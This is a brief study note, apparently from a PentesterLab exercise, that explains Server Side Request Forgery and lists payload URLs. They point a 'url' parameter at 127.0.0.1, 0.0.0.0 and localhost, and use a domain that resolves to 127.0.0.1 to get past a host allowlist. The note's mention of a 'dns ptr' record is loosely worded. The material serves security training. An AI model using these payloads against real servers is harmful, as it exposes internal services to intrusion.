Server Side Request Forgery is a technique used to trick the webserver to connecting to itself. Perhaps there are services running on 127.0.0.1:1234 that you wish to connect. Eg:

http://victim.com/?url=http://127.0.0.1:1234 

Tricks:

?url=http://0.0.0.0:1234
?url=http://localhost:1234
?url=http://assets.pentesterlab.com.hackingwithpentesterlab.link:1234
# asuming that the webserver only allows assets.pentesterlab.com but its dns returns dns ptr for 127.0.0.1 for assets.pentesterlab.com.hackingwithpentesterlab.link
